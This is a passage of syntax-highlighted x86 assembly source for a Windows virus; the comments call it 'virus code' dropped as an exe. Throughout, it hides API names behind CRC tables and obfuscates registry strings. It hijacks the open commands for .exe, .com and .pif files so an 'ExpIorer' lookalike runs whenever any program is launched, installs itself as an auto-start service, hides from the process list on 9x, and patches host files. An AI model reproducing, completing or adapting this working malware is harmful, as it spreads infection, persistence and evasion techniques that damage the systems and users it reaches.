        </span><span class="sc6">movs</span><span class="sc0">    </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc5">test_bits</span><span class="sc0">       </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">near</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">jb</span><span class="sc0">      </span><span class="sc5">copy_bytes</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">sbb</span><span class="sc0">     </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc0">
        </span><span class="sc6">shld</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc6">shl</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">rep</span><span class="sc0">     </span><span class="sc6">stos</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">test_bits</span><span class="sc0">
        </span><span class="sc6">lods</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">test_bits</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">mail_recip</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">junkhtml_inf</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">drop_exp</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">junkhtml_inf</span><span class="sc0">
        </span><span class="sc6">rep</span><span class="sc0">     </span><span class="sc6">movs</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc3">"'"</span><span class="sc0">
        </span><span class="sc6">stos</span><span class="sc0">    </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebp</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">expcrcstk.pWriteFile</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebp</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">expcrcstk.pCloseHandle</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">ebp</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">load_regdll</span><span class="sc0">                     </span><span class="sc1">;allow only 1 copy to run</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">expcrcstk.pWinExec</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc5">load_regdll</span><span class="sc0">     </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">near</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">mail_recip</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">regdll</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">expcrcstk.pLoadLibraryA</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">init_findmz</span><span class="sc0">

</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;API CRC table, null terminated</span><span class="sc0">
</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">

</span><span class="sc5">regcrcbegin</span><span class="sc0">     </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">near</span><span class="sc0">                    </span><span class="sc1">;place &lt; 80h bytes from call for smaller code</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc4">(</span><span class="sc5">regcrc_count</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">regcrcend</span><span class="sc0">       </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">near</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">reg_file</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">regcrcend</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">

</span><span class="sc5">regval</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'ExpIorer "%1" %*'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">regkey</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"\com"</span><span class="sc0">                          </span><span class="sc1">;no regedit.com ;)</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"\exe"</span><span class="sc0">                          </span><span class="sc1">;must be 4 bytes long</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"\pif"</span><span class="sc0">                          </span><span class="sc1">;hook all executable suffix (except .scr which passes /S)</span><span class="sc0">
</span><span class="sc5">reg_file</span><span class="sc0">        </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">near</span><span class="sc0">                    </span><span class="sc1">;must follow immediately</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">HKEY_LOCAL_MACHINE</span><span class="sc0">         </span><span class="sc1">;can obfuscate and same size if push 5+pop ecx+ror ecx, 1</span><span class="sc0">

</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;alter Software\Classes in Local Machine and Current User</span><span class="sc0">
</span><span class="sc1">;because in Windows 2000/XP, Current User values override Local Machine values</span><span class="sc0">
</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">

</span><span class="sc5">reg_loopouter</span><span class="sc0">   </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">near</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">regval</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">reg_file</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">reg_file</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">regkey</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc4">(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">reg_file</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">regkey</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc6">shr</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc0">

</span><span class="sc5">reg_loopinner</span><span class="sc0">   </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">near</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc3">"dna"</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc3">"mmoc"</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc3">"\nep"</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc3">"o\ll"</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc13">"ehs\"
</span><span class="sc0">        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc3">"elif"</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">                 </span><span class="sc1">;comfile, exefile, piffile</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc3">"sess"</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc13">"alc\"
</span><span class="sc0">        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc3">"eraw"</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc3">"tfos"</span><span class="sc0">                          </span><span class="sc1">;obfuscated ;)</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">regkey</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">regval</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebp</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">REG_SZ</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">regcrcstk.rRegSetValueA</span><span class="sc4">]</span><span class="sc0">
                                                </span><span class="sc1">;RegSetValue creates keys</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2ch</span><span class="sc0">                        </span><span class="sc1">;size software\classes\???file\shell\open\command</span><span class="sc0">
        </span><span class="sc6">scas</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">reg_loopinner</span><span class="sc0">
        </span><span class="sc6">loopw</span><span class="sc0">   </span><span class="sc5">reg_loopouter</span><span class="sc0">                   </span><span class="sc1">;decrements CX only</span><span class="sc0">

</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;register as service if NT/2000/XP (recognised but ignored by 9x/Me)</span><span class="sc0">
</span><span class="sc1">;no start service because code is running already</span><span class="sc0">
</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">SC_MANAGER_CREATE_SERVICE</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">regcrcstk.rOpenSCManagerA</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc9">size</span><span class="sc0"> </span><span class="sc5">regcrcstk</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">                             </span><span class="sc1">;SERVICE_ERROR_IGNORE</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">SERVICE_AUTO_START</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">SERVICE_WIN32_OWN_PROCESS</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">reg_file</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">dispname</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">explabel</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">dispname</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">regcrcstk.rCreateServiceA</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">regcrcstk.rCloseServiceHandle</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">regcrcstk.rCloseServiceHandle</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc9">size</span><span class="sc0"> </span><span class="sc5">regcrcstk</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">expcrcstk.pGlobalFree</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">popad</span><span class="sc0">

</span><span class="sc5">host_patch</span><span class="sc0">      </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">near</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0e9h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'rgb!'</span><span class="sc0">

</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;virus code begins here in dropped exe</span><span class="sc0">
</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">

</span><span class="sc5">junkhtml_exe</span><span class="sc0">    </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">near</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">walk_seh</span><span class="sc0">

</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;API CRC table, null terminated</span><span class="sc0">
</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">

</span><span class="sc5">execrcbegin</span><span class="sc0">     </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">near</span><span class="sc0">                    </span><span class="sc1">;place &lt; 80h bytes from call for smaller code</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc4">(</span><span class="sc5">execrc_count</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">execrcend</span><span class="sc0">       </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">near</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">load_user32</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">execrcend</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">

</span><span class="sc5">load_user32</span><span class="sc0">     </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">near</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">skip_user32</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"user32"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">skip_user32</span><span class="sc0">     </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">near</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">execrcstk.eLoadLibraryA</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">init_findmz</span><span class="sc0">

</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;API CRC table, null terminated</span><span class="sc0">
</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">

</span><span class="sc5">usrcrcbegin</span><span class="sc0">     </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">near</span><span class="sc0">                    </span><span class="sc1">;place &lt; 80h bytes from call for smaller code</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc4">(</span><span class="sc5">usrcrc_count</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">usrcrcend</span><span class="sc0">       </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">near</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">get_cmdline</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">usrcrcend</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">

</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;determine platform and dynamically select function types (ANSI or Unicode)</span><span class="sc0">
</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">

</span><span class="sc5">get_cmdline</span><span class="sc0">     </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">near</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc9">size</span><span class="sc0"> </span><span class="sc5">usrcrcstk</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">execrcstk.eGetVersion</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">shr</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1fh</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc4">*</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;RegisterServiceProcess() if 9x/Me (just sets one bit)</span><span class="sc0">
</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">fs</span><span class="sc4">:[</span><span class="sc5">tib.TibTeb</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ecx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">teb.procflags</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">

</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;parse command-line in platform-independent way to see how file was run</span><span class="sc0">
</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">

        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0ffh</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                        </span><span class="sc1">;ffff if Unicode, 00ff if ANSI</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">usrcrcstk.uCharNextW</span><span class="sc4">]</span><span class="sc0">
